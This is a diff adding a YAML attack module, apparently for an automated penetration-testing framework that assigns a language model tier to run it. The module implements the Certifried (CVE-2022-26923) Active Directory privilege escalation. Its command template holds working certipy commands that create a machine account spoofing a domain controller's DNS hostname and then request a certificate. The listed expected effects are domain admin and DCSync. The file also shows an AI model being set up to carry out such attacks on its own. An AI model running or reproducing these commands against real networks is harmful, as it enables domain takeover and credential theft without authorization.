@@ -1,0 +1,39 @@
+name: certifried
+category: ad
+description: Certifried (CVE-2022-26923) — forge DC certificate via dNSHostName spoofing
+preconditions:
+- domain_joined
+- has_cred
+- service.port==445
+- machine_account_quota_positive
+parameters:
+  target_ip: from_engagement.target_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+  password: from_cred.password
+  ca: from_engagement.ca
+  dc_hostname: from_engagement.dc_hostname
+command_template: certipy account create -u '{username}@{domain}' -p '{password}'
+  -dc-ip {target_ip} -user 'PWNED$' -pass 'P4ssw0rd!' -dns '{dc_hostname}' && certipy
+  req -u 'PWNED$@{domain}' -p 'P4ssw0rd!' -ca '{ca}' -template Machine -dc-ip {target_ip}
+parser: generic_parser
+expected_effects:
+- computer_cert_obtained
+- dc_certificate_obtained
+- domain_admin
+falsifier:
+  pattern: STATUS_DUPLICATE_NAME|MachineAccountQuota|ACCESS_DENIED|template not found
+  timeout: 60
+model_tier: sonnet
+mechanism: 'CVE-2022-26923. Create or hijack a computer account with WriteProperty
+  on dNSHostName,
+
+  set its DNS to a DC''s hostname, request a Machine certificate. ADCS embeds dNSHostName
+
+  in SAN; PKINIT then authenticates as the DC computer account → DCSync.
+
+  '
+references:
+  ocd_mindmap: 'Branch 7: Certifried (CVE-2022-26923)'
+  hacktricks: windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md
+hacktricks_ref: windows-hardening/active-directory-methodology/ad-certificates.md
